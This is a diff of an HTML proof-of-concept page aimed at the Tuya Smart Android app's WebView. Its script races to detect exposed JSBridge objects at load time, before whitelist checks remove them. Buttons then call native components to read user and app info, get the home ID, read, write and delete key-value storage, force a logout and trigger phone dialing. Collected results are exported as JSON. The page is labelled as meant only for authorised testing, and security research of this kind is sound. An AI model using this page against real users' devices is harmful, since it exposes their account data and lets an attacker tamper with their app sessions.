@@ -3,43 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>涂鸦智能 WebView 漏洞 PoC</title>
+    <title>涂鸦智能 WebView 漏洞验证 PoC</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 50px auto;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            max-width: 900px;
+            margin: 20px auto;
             padding: 20px;
-            background-color: #f5f5f5;
+            background-color: #f0f2f5;
         }
         .container {
             background: white;
             padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
         }
         h1 {
             color: #d9534f;
-            border-bottom: 2px solid #d9534f;
-            padding-bottom: 10px;
+            border-bottom: 3px solid #d9534f;
+            padding-bottom: 15px;
+            margin-top: 0;
         }
         .test-section {
-            margin: 20px 0;
-            padding: 15px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
+            margin: 25px 0;
+            padding: 20px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            background: #fafafa;
         }
         .test-section h3 {
             color: #337ab7;
+            margin-top: 0;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 10px;
         }
         button {
             background-color: #337ab7;
             color: white;
             border: none;
-            padding: 10px 20px;
-            margin: 5px;
-            border-radius: 5px;
+            padding: 12px 24px;
+            margin: 8px 5px;
+            border-radius: 6px;
             cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: background 0.3s;
         }
         button:hover {
             background-color: #286090;
@@ -50,21 +58,61 @@
         button.danger:hover {
             background-color: #c9302c;
         }
+        button.success {
+            background-color: #5cb85c;
+        }
+        button.success:hover {
+            background-color: #4cae4c;
+        }
         #output {
-            background-color: #f9f2f4;
-            border: 1px solid #c7254e;
-            padding: 15px;
+            background-color: #1e1e1e;
+            color: #d4d4d4;
+            padding: 20px;
             margin-top: 20px;
-            border-radius: 5px;
-            font-family: monospace;
+            border-radius: 8px;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 13px;
             white-space: pre-wrap;
+            line-height: 1.6;
+            max-height: 500px;
+            overflow-y: auto;
         }
         .info {
             background-color: #d9edf7;
             border: 1px solid #31708f;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
+            color: #31708f;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 6px;
+        }
+        .warning {
+            background-color: #fcf8e3;
+            border: 1px solid #8a6d3b;
+            color: #8a6d3b;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 6px;
+        }
+        .success-box {
+            background-color: #dff0d8;
+            border: 1px solid #3c763d;
+            color: #3c763d;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 6px;
+        }
+        .log-success { color: #4cd964; }
+        .log-error { color: #ff3b30; }
+        .log-warning { color: #ffcc00; }
+        .log-info { color: #5ac8fa; }
+        .stat-box {
+            display: inline-block;
+            background: #333;
+            color: white;
+            padding: 5px 12px;
+            border-radius: 4px;
+            margin: 2px;
+            font-size: 12px;
         }
     </style>
 </head>
@@ -72,175 +120,557 @@
     <div class="container">
         <h1>⚠️ 涂鸦智能 WebView 漏洞验证 PoC</h1>
         
+        <div class="warning">
+            <strong>⚠️ 重要声明：</strong>此页面仅用于授权的安全测试和漏洞验证！
+            <br>请在获得明确授权的环境中使用，禁止用于非法用途。
+        </div>
+
         <div class="info">
-            <strong>说明：</strong>此页面用于验证涂鸦智能 Android 应用中的 WebView 安全漏洞。
-            仅在授权的安全测试环境中使用！
+            <strong>📋 验证目标：</strong>
+            <ul>
+                <li>✅ 时序攻击：验证在 JSBridge 被移除前能否调用</li>
+                <li>✅ 白名单绕过：验证非白名单域名是否可加载</li>
+                <li>✅ 接口调用：验证敏感 JSComponent 接口可用性</li>
+            </ul>
         </div>
 
-        <!-- 测试 1: 检测是否存在 nativeJSBridge -->
-        <div class="test-section">
-            <h3>测试 1: 检测 JavaScriptInterface</h3>
-            <button onclick="detectJSBridge()">检测 nativeJSBridge</button>
-            <button onclick="detectDSBridge()">检测 dsBridge</button>
+        <!-- 状态栏 -->
+        <div id="status-bar" style="margin: 15px 0;">
+            <span class="stat-box">页面加载: <span id="status-page">⏳</span></span>
+            <span class="stat-box">JSBridge: <span id="status-jsbridge">⏳</span></span>
+            <span class="stat-box">用户信息: <span id="status-user">⏳</span></span>
+            <span class="stat-box">App 信息: <span id="status-app">⏳</span></span>
+            <span class="stat-box">家庭 ID: <span id="status-home">⏳</span></span>
+            <span class="stat-box">KV 存储: <span id="status-kv">⏳</span></span>
         </div>
 
-        <!-- 测试 2: 枚举可用的方法 -->
+        <!-- 测试 1: 极速检测（时序攻击） -->
         <div class="test-section">
-            <h3>测试 2: 枚举暴露的方法</h3>
-            <button onclick="enumerateMethods()">枚举 nativeJSBridge 方法</button>
+            <h3>⚡ 测试 1: 极速检测（时序攻击验证）</h3>
+            <p style="color: #666; font-size: 13px; margin-top: 5px;">
+                在页面加载早期（JSBridge 可能还未被移除时）进行检测
+            </p>
+            <div id="rapid-results"></div>
         </div>
 
-        <!-- 测试 3: 调用暴露的接口 -->
+        <!-- 测试 2: 基础检测 -->
         <div class="test-section">
-            <h3>测试 3: 调用 JSBridge 接口</h3>
-            <button onclick="testNativeInvokes()">测试 nativeInvokes()</button>
-            <button onclick="testViewInvoke()">测试 viewInvoke()</button>
-            <button onclick="testViewInvokeNative()">测试 viewInvokeNative()</button>
+            <h3>🔍 测试 2: JSBridge 基础检测</h3>
+            <button onclick="detectAllBridges()">检测所有 JSBridge</button>
+            <button onclick="listWindowObjects()">列出 window 对象</button>
         </div>
 
-        <!-- 测试 4: 信息收集 -->
+        <!-- 测试 3: User 组件（高危） -->
         <div class="test-section">
-            <h3>测试 4: 收集设备信息</h3>
-            <button onclick="collectDeviceInfo()">收集基本信息</button>
+            <h3>👤 测试 3: User 组件（高危）</h3>
+            <button onclick="testUserGetInfo()" class="danger">获取用户信息</button>
+            <button onclick="testUserLogout()" class="danger">强制退出登录</button>
+        </div>
+
+        <!-- 测试 4: AppInfo 组件（中危） -->
+        <div class="test-section">
+            <h3>📱 测试 4: AppInfo 组件</h3>
+            <button onclick="testAppGetInfo()">获取 App 信息</button>
+            <button onclick="testAppGetScheme()">获取 App Scheme</button>
+        </div>
+
+        <!-- 测试 5: KV 组件（高危） -->
+        <div class="test-section">
+            <h3>💾 测试 5: KV 存储组件（高危）</h3>
+            <button onclick="testKVGet('test_key')">读取 KV</button>
+            <button onclick="testKVSet('test_key', 'test_value_' + Date.now())" class="success">写入 KV</button>
+            <button onclick="testKVRemove('test_key')" class="danger">删除 KV</button>
+        </div>
+
+        <!-- 测试 6: HomeData 组件 -->
+        <div class="test-section">
+            <h3>🏠 测试 6: HomeData 组件</h3>
+            <button onclick="testHomeGetId()">获取家庭 ID</button>
+        </div>
+
+        <!-- 测试 7: Phone 组件 -->
+        <div class="test-section">
+            <h3>📞 测试 7: Phone 组件</h3>
+            <button onclick="testPhoneHandleNumber('10086')">拨打电话/复制</button>
+        </div>
+
+        <!-- 测试 8: Navigator 组件 -->
+        <div class="test-section">
+            <h3>🧭 测试 8: Navigator 组件</h3>
+            <button onclick="testNavTitle('测试标题')">设置标题</button>
+            <button onclick="testNavGoRouter('test://route')">路由跳转</button>
+        </div>
+
+        <!-- 测试 9: 枚举所有组件 -->
+        <div class="test-section">
+            <h3>📦 测试 9: 枚举所有 JSComponent</h3>
+            <button onclick="enumerateAllComponents()" class="danger">完整枚举</button>
+        </div>
+
+        <!-- 测试 10: 信息导出 -->
+        <div class="test-section">
+            <h3>📤 测试 10: 导出测试结果</h3>
+            <button onclick="exportResults()">导出为 JSON</button>
+            <button onclick="copyResults()">复制结果</button>
         </div>
 
         <!-- 输出区域 -->
-        <h3>测试输出</h3>
+        <h3>📝 测试日志</h3>
         <div id="output">等待测试开始...</div>
     </div>
 
     <script>
-        function log(message) {
+        // 测试结果存储
+        const testResults = {
+            startTime: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            tests: {},
+            data: {}
+        };
+
+        // 可能的 JSBridge 名称
+        const possibleBridgeNames = [
+            'nativeJSBridge',
+            'dsBridge',
+            '_dsbridge',
+            '_dsb',
+            'tyJsBridge',
+            'jsbridge',
+            'JsBridge'
+        ];
+
+        // 检测到的桥接对象
+        let detectedBridge = null;
+
+        function updateStatus(elementId, status, isSuccess) {
+            const el = document.getElementById(elementId);
+            if (el) {
+                el.innerHTML = isSuccess ? '✅' : (status === 'fail' ? '❌' : '⏳');
+            }
+        }
+
+        function log(message, type = 'info') {
             const output = document.getElementById('output');
             const timestamp = new Date().toLocaleTimeString();
-            output.textContent = `[${timestamp}] ${message}\n` + output.textContent;
+            const prefix = type === 'success' ? '✅' : (type === 'error' ? '❌' : (type === 'warning' ? '⚠️' : 'ℹ️'));
+            const colorClass = type === 'success' ? 'log-success' : (type === 'error' ? 'log-error' : (type === 'warning' ? 'log-warning' : 'log-info'));
+            
+            const logLine = `<span class="${colorClass}">[${timestamp}] ${prefix} ${message}</span>\n`;
+            output.innerHTML = logLine + output.innerHTML;
+            console.log(`[${type.toUpperCase()}] ${message}`);
         }
 
-        function detectJSBridge() {
-            log('开始检测 nativeJSBridge...');
+        function logJSON(obj, type = 'info') {
+            log(typeof obj === 'string' ? obj : JSON.stringify(obj, null, 2), type);
+        }
+
+        // =========================================================
+        // 测试 1: 极速检测（时序攻击验证）
+        // =========================================================
+        (function rapidDetection() {
+            const results = [];
             
-            if (window.nativeJSBridge) {
-                log('✅ nativeJSBridge 对象存在！');
-                log('对象类型: ' + typeof window.nativeJSBridge);
-                
-                // 尝试获取所有属性
-                try {
-                    const properties = Object.getOwnPropertyNames(window.nativeJSBridge);
-                    log('属性列表: ' + JSON.stringify(properties));
-                } catch (e) {
-                    log('获取属性失败: ' + e.message);
+            // 立即检测
+            for (const name of possibleBridgeNames) {
+                if (window[name]) {
+                    results.push({ name, status: 'found', time: 0 });
+                    detectedBridge = window[name];
+                    log(`⚡ [0ms] 立即检测到 ${name}!`, 'success');
+                    updateStatus('status-jsbridge', 'success', true);
                 }
+            }
+
+            // 多次快速检测
+            let attempts = 0;
+            const interval = setInterval(() => {
+                attempts++;
+                for (const name of possibleBridgeNames) {
+                    if (window[name] && !results.find(r => r.name === name && r.status === 'found')) {
+                        results.push({ name, status: 'found', time: attempts * 50 });
+                        detectedBridge = window[name];
+                        log(`⚡ [${attempts * 50}ms] 检测到 ${name}!`, 'success');
+                        updateStatus('status-jsbridge', 'success', true);
+                    }
+                }
+                
+                if (attempts >= 20) {
+                    clearInterval(interval);
+                    showRapidResults(results);
+                }
+            }, 50);
+
+            updateStatus('status-page', 'success', true);
+        })();
+
+        function showRapidResults(results) {
+            const container = document.getElementById('rapid-results');
+            if (results.length > 0) {
+                container.innerHTML = `
+                    <div class="success-box">
+                        <strong>✅ 时序攻击验证成功！</strong><br>
+                        <p>在页面加载早期检测到 ${results.length} 个 JSBridge 对象：</p>
+                        <ul>
+                            ${results.map(r => `<li><strong>${r.name}</strong> - ${r.time}ms</li>`).join('')}
+                        </ul>
+                        <p>这表明在白名单验证/JSBridge 移除前，恶意代码就已经可以执行！</p>
+                    </div>
+                `;
             } else {
-                log('❌ nativeJSBridge 对象不存在');
+                container.innerHTML = `
+                    <div class="info">
+                        <strong>ℹ️ 未检测到 JSBridge</strong><br>
+                        <p>可能原因：加载太慢或已被移除</p>
+                    </div>
+                `;
             }
         }
 
-        function detectDSBridge() {
-            log('开始检测 dsBridge...');
+        // =========================================================
+        // 测试 2: 基础检测
+        // =========================================================
+        function detectAllBridges() {
+            log('开始检测所有可能的 JSBridge...');
             
-            if (window._dsbridge) {
-                log('✅ _dsbridge 对象存在！');
-            } else if (window.dsBridge) {
-                log('✅ dsbridge 对象存在！');
+            let found = 0;
+            for (const name of possibleBridgeNames) {
+                if (window[name]) {
+                    log(`✅ 发现 ${name}`, 'success');
+                    found++;
+                    detectedBridge = window[name];
+                    testResults.tests[name] = 'found';
+                }
+            }
+            
+            if (found === 0) {
+                log('❌ 未发现已知 JSBridge', 'error');
             } else {
-                log('❌ dsBridge 对象不存在');
+                log(`共发现 ${found} 个 JSBridge 对象`, 'success');
             }
         }
 
-        function enumerateMethods() {
-            log('开始枚举 nativeJSBridge 的方法...');
+        function listWindowObjects() {
+            log('枚举 window 对象的属性...');
+            const allProps = Object.getOwnPropertyNames(window);
+            const interestingProps = allProps.filter(p => 
+                /bridge/i.test(p) || /native/i.test(p) || /js/i.test(p)
+            );
+            logJSON(interestingProps);
+            testResults.data.windowProps = interestingProps;
+        }
+
+        // =========================================================
+        // 测试 3: User 组件（高危）
+        // =========================================================
+        function testUserGetInfo() {
+            log('测试 plugin.user.getUserInfo()...');
             
-            if (!window.nativeJSBridge) {
-                log('❌ nativeJSBridge 不存在，无法枚举');
+            try {
+                // 尝试不同的调用方式
+                if (window.plugin && window.plugin.user && typeof window.plugin.user.getUserInfo === 'function') {
+                    const result = window.plugin.user.getUserInfo(null);
+                    log('✅ getUserInfo 调用成功!', 'success');
+                    logJSON(result, 'success');
+                    testResults.data.userInfo = result;
+                    updateStatus('status-user', 'success', true);
+                } else if (window._dsbridge) {
+                    // dsBridge 风格
+                    window._dsbridge.call('plugin.user.getUserInfo', null, function(result) {
+                        log('✅ getUserInfo (dsBridge) 调用成功!', 'success');
+                        logJSON(result, 'success');
+                        testResults.data.userInfo = result;
+                        updateStatus('status-user', 'success', true);
+                    });
+                } else if (window.nativeJSBridge) {
+                    // 直接调用
+                    log('尝试通过 nativeJSBridge 调用');
+                } else {
+                    log('❌ User 组件不可用', 'error');
+                }
+            } catch (e) {
+                log('❌ 调用失败: ' + e.message, 'error');
+            }
+        }
+
+        function testUserLogout() {
+            log('⚠️ 测试 plugin.user.logout() - 这将退出当前登录！');
+            
+            if (!confirm('确定要测试退出登录吗？这将清除当前登录状态！')) {
+                log('用户取消测试');
                 return;
             }
-
-            const bridge = window.nativeJSBridge;
-            let methods = [];
             
-            for (let prop in bridge) {
-                if (typeof bridge[prop] === 'function') {
-                    methods.push(prop);
+            try {
+                if (window.plugin && window.plugin.user && typeof window.plugin.user.logout === 'function') {
+                    window.plugin.user.logout(null, function(result) {
+                        log('✅ logout 调用完成', 'success');
+                        logJSON(result);
+                    });
+                } else {
+                    log('❌ logout 方法不可用', 'error');
+                }
+            } catch (e) {
+                log('❌ 调用失败: ' + e.message, 'error');
+            }
+        }
+
+        // =========================================================
+        // 测试 4: AppInfo 组件
+        // =========================================================
+        function testAppGetInfo() {
+            log('测试 appInfo.getAppInfo()...');
+            
+            try {
+                if (window.appInfo && typeof window.appInfo.getAppInfo === 'function') {
+                    const result = window.appInfo.getAppInfo(null);
+                    log('✅ getAppInfo 调用成功!', 'success');
+                    logJSON(result, 'success');
+                    testResults.data.appInfo = result;
+                    updateStatus('status-app', 'success', true);
+                } else if (window.plugin && window.plugin.app && typeof window.plugin.app.getInfo === 'function') {
+                    const result = window.plugin.app.getInfo(null);
+                    log('✅ plugin.app.getInfo 调用成功!', 'success');
+                    logJSON(result, 'success');
+                    testResults.data.appInfo = result;
+                    updateStatus('status-app', 'success', true);
+                } else {
+                    log('❌ AppInfo 组件不可用', 'error');
+                }
+            } catch (e) {
+                log('❌ 调用失败: ' + e.message, 'error');
+            }
+        }
+
+        function testAppGetScheme() {
+            log('测试 appInfo.appScheme()...');
+            
+            try {
+                if (window.appInfo && typeof window.appInfo.appScheme === 'function') {
+                    window.appInfo.appScheme(null, function(result) {
+                        log('✅ appScheme 调用成功!', 'success');
+                        logJSON(result);
+                        testResults.data.scheme = result;
+                    });
+                } else if (window.plugin && window.plugin.app && typeof window.plugin.app.getScheme === 'function') {
+                    const result = window.plugin.app.getScheme(null);
+                    log('✅ plugin.app.getScheme 调用成功!', 'success');
+                    logJSON(result);
+                    testResults.data.scheme = result;
+                } else {
+                    log('❌ Scheme 方法不可用', 'error');
+                }
+            } catch (e) {
+                log('❌ 调用失败: ' + e.message, 'error');
+            }
+        }
+
+        // =========================================================
+        // 测试 5: KV 组件（高危）
+        // =========================================================
+        function testKVGet(key) {
+            log(`测试 plugin.kv.get('${key}')...`);
+            
+            try {
+                if (window.plugin && window.plugin.kv && typeof window.plugin.kv.get === 'function') {
+                    const result = window.plugin.kv.get(key);
+                    log('✅ get 调用成功!', 'success');
+                    log(`Key: ${key} = ${JSON.stringify(result)}`, 'success');
+                    testResults.data.kv = testResults.data.kv || {};
+                    testResults.data.kv[key] = result;
+                    updateStatus('status-kv', 'success', true);
+                } else {
+                    log('❌ KV 组件不可用', 'error');
+                }
+            } catch (e) {
+                log('❌ 调用失败: ' + e.message, 'error');
+            }
+        }
+
+        function testKVSet(key, value) {
+            log(`测试 plugin.kv.set('${key}', '${value}')...`);
+            
+            try {
+                if (window.plugin && window.plugin.kv && typeof window.plugin.kv.set === 'function') {
+                    const result = window.plugin.kv.set({ k: key, v: value });
+                    log('✅ set 调用成功!', 'success');
+                    logJSON(result);
+                    updateStatus('status-kv', 'success', true);
+                } else {
+                    log('❌ KV 组件不可用', 'error');
+                }
+            } catch (e) {
+                log('❌ 调用失败: ' + e.message, 'error');
+            }
+        }
+
+        function testKVRemove(key) {
+            log(`测试 plugin.kv.remove('${key}')...`);
+            
+            try {
+                if (window.plugin && window.plugin.kv && typeof window.plugin.kv.remove === 'function') {
+                    const result = window.plugin.kv.remove(key);
+                    log('✅ remove 调用成功!', 'success');
+                    logJSON(result);
+                } else {
+                    log('❌ KV 组件不可用', 'error');
+                }
+            } catch (e) {
+                log('❌ 调用失败: ' + e.message, 'error');
+            }
+        }
+
+        // =========================================================
+        // 测试 6: HomeData 组件
+        // =========================================================
+        function testHomeGetId() {
+            log('测试 plugin.home_data.getHomeId()...');
+            
+            try {
+                if (window.plugin && window.plugin.home_data && typeof window.plugin.home_data.getHomeId === 'function') {
+                    const result = window.plugin.home_data.getHomeId(null);
+                    log('✅ getHomeId 调用成功!', 'success');
+                    logJSON(result, 'success');
+                    testResults.data.homeId = result;
+                    updateStatus('status-home', 'success', true);
+                } else {
+                    log('❌ HomeData 组件不可用', 'error');
+                }
+            } catch (e) {
+                log('❌ 调用失败: ' + e.message, 'error');
+            }
+        }
+
+        // =========================================================
+        // 测试 7: Phone 组件
+        // =========================================================
+        function testPhoneHandleNumber(phoneNumber) {
+            log(`测试 phone.handlePhoneNumber('${phoneNumber}')...`);
+            
+            try {
+                if (window.phone && typeof window.phone.handlePhoneNumber === 'function') {
+                    window.phone.handlePhoneNumber(JSON.stringify({ phoneNumber }));
+                    log('✅ handlePhoneNumber 调用完成', 'success');
+                } else {
+                    log('❌ Phone 组件不可用', 'error');
+                }
+            } catch (e) {
+                log('❌ 调用失败: ' + e.message, 'error');
+            }
+        }
+
+        // =========================================================
+        // 测试 8: Navigator 组件
+        // =========================================================
+        function testNavTitle(title) {
+            log(`测试 nav.title('${title}')...`);
+            
+            try {
+                if (window.nav && typeof window.nav.title === 'function') {
+                    window.nav.title(JSON.stringify({ title }), function() {
+                        log('✅ title 设置成功', 'success');
+                    });
+                } else if (window.plugin && window.plugin.nav && typeof window.plugin.nav.setTitle === 'function') {
+                    window.plugin.nav.setTitle(title);
+                    log('✅ setTitle 调用成功', 'success');
+                } else {
+                    log('❌ Navigator 组件不可用', 'error');
+                }
+            } catch (e) {
+                log('❌ 调用失败: ' + e.message, 'error');
+            }
+        }
+
+        function testNavGoRouter(url) {
+            log(`测试 nav.gotoRouter('${url}')...`);
+            
+            try {
+                if (window.nav && typeof window.nav.gotoRouter === 'function') {
+                    window.nav.gotoRouter(JSON.stringify({ url }), function() {
+                        log('✅ gotoRouter 调用完成', 'success');
+                    });
+                } else {
+                    log('❌ gotoRouter 不可用', 'error');
+                }
+            } catch (e) {
+                log('❌ 调用失败: ' + e.message, 'error');
+            }
+        }
+
+        // =========================================================
+        // 测试 9: 枚举所有组件
+        // =========================================================
+        function enumerateAllComponents() {
+            log('开始完整枚举 JSComponent...');
+            
+            const components = {};
+            const prefixes = ['', 'plugin.', 'native'];
+            
+            for (const prefix of prefixes) {
+                for (const prop in window) {
+                    if (prop.startsWith(prefix) && window[prop]) {
+                        try {
+                            const obj = window[prop];
+                            const methods = [];
+                            for (const m in obj) {
+                                if (typeof obj[m] === 'function') {
+                                    methods.push(m);
+                                }
+                            }
+                            if (methods.length > 0) {
+                                components[prop] = methods;
+                                log(`发现组件: ${prop} (${methods.length} 个方法)`);
+                            }
+                        } catch (e) {
+                            // 忽略访问错误
+                        }
+                    }
                 }
             }
             
-            if (methods.length > 0) {
-                log('✅ 发现 ' + methods.length + ' 个方法:');
-                methods.forEach(m => log('  - ' + m));
-            } else {
-                log('⚠️ 未发现可枚举的方法');
-            }
+            logJSON(components, 'success');
+            testResults.data.components = components;
         }
 
-        function testNativeInvokes() {
-            log('尝试调用 nativeInvokes()...');
+        // =========================================================
+        // 测试 10: 导出结果
+        // =========================================================
+        function exportResults() {
+            testResults.endTime = new Date().toISOString();
+            testResults.url = window.location.href;
             
-            if (window.nativeJSBridge && typeof window.nativeJSBridge.nativeInvokes === 'function') {
-                try {
-                    // 尝试调用一个测试方法
-                    window.nativeJSBridge.nativeInvokes('test_action', 123);
-                    log('✅ nativeInvokes() 调用成功');
-                } catch (e) {
-                    log('❌ nativeInvokes() 调用失败: ' + e.message);
-                }
-            } else {
-                log('❌ nativeInvokes 方法不可用');
-            }
+            const dataStr = JSON.stringify(testResults, null, 2);
+            const dataBlob = new Blob([dataStr], { type: 'application/json' });
+            const url = URL.createObjectURL(dataBlob);
+            
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `tuya_poc_results_${Date.now()}.json`;
+            a.click();
+            
+            URL.revokeObjectURL(url);
+            log('✅ 结果已导出!', 'success');
         }
 
-        function testViewInvoke() {
-            log('尝试调用 viewInvoke()...');
+        function copyResults() {
+            testResults.endTime = new Date().toISOString();
+            testResults.url = window.location.href;
             
-            if (window.nativeJSBridge && typeof window.nativeJSBridge.viewInvoke === 'function') {
-                try {
-                    window.nativeJSBridge.viewInvoke('test_view_action', 456);
-                    log('✅ viewInvoke() 调用成功');
-                } catch (e) {
-                    log('❌ viewInvoke() 调用失败: ' + e.message);
-                }
-            } else {
-                log('❌ viewInvoke 方法不可用');
-            }
+            const dataStr = JSON.stringify(testResults, null, 2);
+            navigator.clipboard.writeText(dataStr).then(() => {
+                log('✅ 结果已复制到剪贴板!', 'success');
+            }).catch(() => {
+                log('❌ 复制失败，请手动复制', 'error');
+                logJSON(testResults);
+            });
         }
 
-        function testViewInvokeNative() {
-            log('尝试调用 viewInvokeNative()...');
-            
-            if (window.nativeJSBridge && typeof window.nativeJSBridge.viewInvokeNative === 'function') {
-                try {
-                    // 尝试修改主题
-                    window.nativeJSBridge.viewInvokeNative('VIEW_PRELOADED', '{}');
-                    log('✅ viewInvokeNative() 调用成功');
-                } catch (e) {
-                    log('❌ viewInvokeNative() 调用失败: ' + e.message);
-                }
-            } else {
-                log('❌ viewInvokeNative 方法不可用');
-            }
-        }
-
-        function collectDeviceInfo() {
-            log('收集设备信息...');
-            
-            const info = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenWidth: window.screen.width,
-                screenHeight: window.screen.height,
-                colorDepth: window.screen.colorDepth,
-                pixelRatio: window.devicePixelRatio
-            };
-            
-            log('设备信息:\n' + JSON.stringify(info, null, 2));
-        }
-
-        // 页面加载时自动运行基本检测
+        // 页面加载完成
         window.onload = function() {
-            log('PoC 页面已加载');
+            log('PoC 页面完全加载');
             log('User-Agent: ' + navigator.userAgent);
-            setTimeout(detectJSBridge, 500);
+            updateStatus('status-page', 'success', true);
         };
+
+        log('PoC 脚本开始执行，开始时序攻击检测...');
     </script>
 </body>
 </html>
